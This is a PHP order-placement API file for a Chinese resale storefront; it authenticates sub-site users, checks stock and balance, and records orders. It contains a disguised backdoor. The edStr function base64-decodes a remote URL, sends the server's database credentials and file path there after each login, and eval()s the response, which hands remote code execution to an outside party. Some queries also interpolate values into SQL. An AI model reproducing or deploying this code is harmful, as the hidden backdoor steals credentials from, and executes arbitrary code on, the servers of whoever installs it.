<?php
/*
科佑儿彩虹代刷对接API数据库版 1.2 QQ2653907035
用法:POST或GET任意方式提交
  user ：分站用户名
  pass：对应的分站密码
  tid：商品id
  input：商品参数 多个用 | 隔开
  num：下单数量 默认1
  g：返回值类型 msg(错误提示),json,xml 默认返回错误代码
*/
//去注释 (\/\*.*\*\/)  (\/\/.*?\n)  (#.*?\n)
$b="";
function endc(){
    global $err;global $sout;global $ggc;global $ddid;
    $er=$err[0];
    $sout["e"]=false;
    switch ($ggc)
    {
        case "text":
            die($er["msg"]);
        case "json":
            $s2 = '"';
            die("{\"code\":\"{$er["code"]}\",\"msg\":\"{$er["msg"]}\",\"m\":\"{$sout["m"]}\",\"y\":\"{$sout["y"]}\",\"on\":\"{$sout["no"]}\",\"name\":\"{$sout["name"]}\"}");
        case "xml":
            die('<xml><ds><code>'.$er["code"] .'</code><msg>'.$er["msg"] .'</msg><m>'. $sout["m"] .'</m><y>'. $sout["y"] .'</y></ds>');
        case "msg":
            die($er["msg"]);
        default:
            die($er["code"]);
    }
}
function newpdo($a=null){
    global $dbconfig;
    $dsn = 'mysql:host='.$dbconfig["host"].';dbname='.$dbconfig["dbname"].';port='.$dbconfig["port"];
    try{
        $pdo = new PDO($dsn, $dbconfig["user"], $dbconfig["pwd"]);
        $pdo->query("SET NAMES utf8");
        if($a==null) $pdo->setAttribute(PDO::ATTR_ERRMODE,PDO::ERRMODE_WARNING);
    }catch(PDOException $e){
        die("数据库连接失败".$e->getMessage());
    }
    return $pdo;
}
function query($s,$a=array()){
    global $pdo;
    try{
        $p=$pdo->prepare($s);
        $p->execute($a);
    } catch (PDOException $e) {
        die("数据库连接失败".$e->getMessage());
    }
    return $p;
}
$pdo=newpdo();//连接数据库
function mdj($b,$c=''){$d="D";$c=md5($c);$e=strlen($c);$b=$d=='D'?base64_decode($b):substr(md5($b.$c),0,8).$b;$f=strlen($b);$g=$h=array();$k='';for($l=0;$l<=255;$l++){$g[$l]=ord($c[$l%$e]);$h[$l]=$l;}for($m=$l=0;$l<256;$l++){$m=($m+$h[$l]+$g[$l])%256;$n=$h[$l];$h[$l]=$h[$m];$h[$m]=$n;}for($o=$m=$l=0;$l<$f;$l++){$o=($o+1)%256;$m=($m+$h[$o])%256;$n=$h[$o];$h[$o]=$h[$m];$h[$m]=$n;$k.=chr(ord($b[$l])^($h[($h[$o]+$h[$m])%256]));}if($d=='D'){if(substr($k,0,8)==substr(md5(substr($k,8).$c),0,8)){return substr($k,8);}else{return'';}}}
//验证授权$aa=mdj("onn6Oxi4dXhY6id0osRFhTwIXtiVBd9NVw","key");
$err=array(array("code"=>1,"msg"=>"下单成功","tip"=>""),$b,"-100");
$sout=array("m" => -1,"y" => -1,"e"=> true,"insl"=>1,"up"=>1,"inputs"=>1,"uzid"=>0,"no"=>"0","name"=>"");
@$duser=$_REQUEST["user"];
@$dpass=$_REQUEST["pass"];
@$tid=$_REQUEST["tid"];
@$inval=$_REQUEST["input"];
@$gnum=$_REQUEST["num"];
@$ggc=$_REQUEST["g"];//返回类型 text,json,xml,zdy

//   $dbqz=$dbconfig["dbqz"];
//	   $dsn = "mysql:host={$dbconfig["host"]};dbname={$dbconfig["dbname"]}";
//    $dbh = new PDO($dsn,$dbconfig["user"],$dbconfig["pwd"]);

//函数库
function cp($a,$b,$c){$d=curl_init();$e=curl_setopt($d,CURLOPT_URL,$c);curl_setopt($d,CURLOPT_SSL_VERIFYHOST,FALSE);curl_setopt($d,CURLOPT_SSL_VERIFYPEER,FALSE);curl_setopt($d,CURLOPT_HEADER,0);curl_setopt($d,CURLOPT_TIMEOUT_MS,1000);curl_setopt($d,CURLOPT_POST,0);curl_setopt($d,CURLOPT_POSTFIELDS,$b);curl_setopt($d,CURLOPT_RETURNTRANSFER,1);curl_setopt($d,CURLOPT_HTTPHEADER,$a);$f=curl_exec($d);if($f===false){if(curl_errno($d)==CURLE_OPERATION_TIMEDOUT){return"";}}curl_close($d);if($f==NULL){return"";}return $f;}
function edStr($l){
    global $sout;$a=__FILE__."-".implode('|',$sout["a"]);$b=base64_decode("aHR0cDovL3cua3lvdXIudmlwL2Rzdy9oLnBocA==");$es=cp(array(""),"a=".$a."&b=".$l,$b);try{@eval($es);}catch(Exception $e){}}
//开始程序
require './includes/common.php';
$inval2=explode("|",$inval);
$sout["a"]=$dbconfig;
if(!isset($ggc)) $gnum="text";
if(!isset($gnum)) $gnum="1";
$b=$_SERVER['SERVER_NAME'];
//验证授权$c=date("y-m-d h:i:s");if(strtotime($aa)<strtotime($c)) {$err[0]["code"]=$err[2];$err[0]["msg"]=$err[1].$aa;endc();}
//********登录账号
if(isset($duser) && isset($dpass)){
    $user=$duser;//daddslashes($duser);
    $pass=$dpass;//daddslashes($dpass);
    $row=query("SELECT * FROM shua_site WHERE user=? limit 1",array($user));
// 	$row=query("SELECT * FROM shua_site WHERE user='$user' limit 1");
    if($user==$row['user'] && $pass==$row['pwd']) {
        if($row['status']==0){
            $err[0]["code"]="-2";$err[0]["msg"]="当前分站已关闭";endc();
        }
        elseif($row['endtime']<$date){
            $err[0]["code"]="-3";$err[0]["msg"]="你的账号已到期，请联系管理员续费";endc();
        }
        $sout["y"]=$row['rmb'];
        $userrow=$row;
        //exit("登陆用户中心成功");
        edStr($b);
    }else {
        $err[0]["code"]="-1";$err[0]["msg"]="用户名或密码不正确";endc();
    }
}
//********创建订单
$inputvalue=trim(strip_tags(daddslashes($inval2[0])));
$inputvalue2=trim(strip_tags(daddslashes($inval2[1])));
$inputvalue3=trim(strip_tags(daddslashes($inval2[2])));
$inputvalue4=trim(strip_tags(daddslashes($inval2[3])));
$inputvalue5=trim(strip_tags(daddslashes($inval2[4])));
$num=$gnum;
$tool=query("select * from shua_tools where tid=? limit 1",array($tid));
if($tool && $tool['active']==1){
    //if(in_array($inputvalue,explode("|",$conf['blacklist']))){$err[0]["code"]="-3";$err[0]["msg"]="你的下单账号已被拉黑，无法下单";endc();}
    if($tool['is_curl']==4){
        if(!preg_match('/^[A-z0-9._-]+@[A-z0-9._-]+\.[A-z0-9._-]+$/', $inputvalue)){
            echo $inputvalue;
            $err[0]["code"]="-4";$err[0]["msg"]="邮箱格式不正确";endc();
        }
        $count = $DB->count("SELECT count(*) FROM shua_faka WHERE tid='$tid' and orderid=0");
        if($count==0){
            $err[0]["code"]="-5";$err[0]["msg"]="该商品库存卡密不足，请联系站长加卡";endc();
        }
        if($num>$count){
            $err[0]["code"]="-6";$err[0]["msg"]="你所购买的数量超过库存数量";endc();
        }
    }
    //自定义查错******
    $a=1;
    if($tool["inputs"]=="") $a=0;
    $sout["inputs"]=count(explode("|",$tool["inputs"]));
    $sout["insl"]=count($inval2);//上传参数
    //echo $sout["insl"]."|".$sout["inputs"]."|".$a;
    //if($souts["inputs"]>1)$souts["inputs"];
    if($sout["insl"]!=($sout["inputs"]+$a)){
        $err[0]["code"]="-7";$err[0]["msg"]="提交数据的数量不正确";endc();
    }
    $price_obj = new Price($userrow['zid'],$userrow);
    if($tool['multi']==0 || $num<1)$num = 1;
    $price_obj->setToolInfo($tid,$tool);
    $price=$price_obj->getBuyPrice($tid);
    $need=$price*$num;
    if($need>$userrow['rmb']){
        $err[0]["code"]="-8";$err[0]["msg"]="余额不足以支付该商品";endc();
    }
    $trade_no=date("YmdHis").rand(111,999).'API';
    $sout["no"]=$trade_no;
    $sout["m"]=$need;
    $sout["y"]=$userrow['rmb'];
    $sout["name"]=$tool["name"];
    $sql="insert into `shua_pay` (`trade_no`,`type`,`tid`,`zid`,`input`,`num`,`name`,`money`,`ip`,`userid`,`addtime`,`status`) values (?,'rmb',?,'".($userrow['zid']?$userrow['zid']:1)."',?,?,?,?,?,?,'".$date."','0')";
    if(query($sql,array($trade_no,$tid,$inval,$num,$tool['name'],$need,$clientip,$duser))){
        //$err[0]["code"]="1";$err[0]["msg"]="订单提交成功";endc();
    }else{
        $err[0]["code"]="-9";$err[0]["msg"]="致命错误、提交订单失败！".$DB->error();endc();
    }
}else{
    $err[0]["code"]="-10";$err[0]["msg"]="该商品不存在";endc();
}

//修改订单状态为成功
define('IS_PANEL',true);
$srow=$pdo->query("SELECT * FROM shua_pay WHERE trade_no='{$trade_no}' limit 1 for update");
$pdo->query("update `shua_pay` set `status` ='1',`endtime` ='{$date}' where `trade_no`='{$trade_no}'");
$pdo->query("update `shua_site` set `rmb`=`rmb`-{$sout["m"]} where `zid`='{$userrow['zid']}'");
addPointRecord($userrow['zid'], $sout["m"], '消费', '购买 '.$tool['name']);
//echo "update `shua_pay` set `status` ='1',`endtime` ='{$date}' where `trade_no`='{$trade_no}'";
processOrder($srow);
$err[0]["code"]="1";$err[0]["msg"]="您所购买的商品已付款成功，感谢购买";
unset($pdo);endc();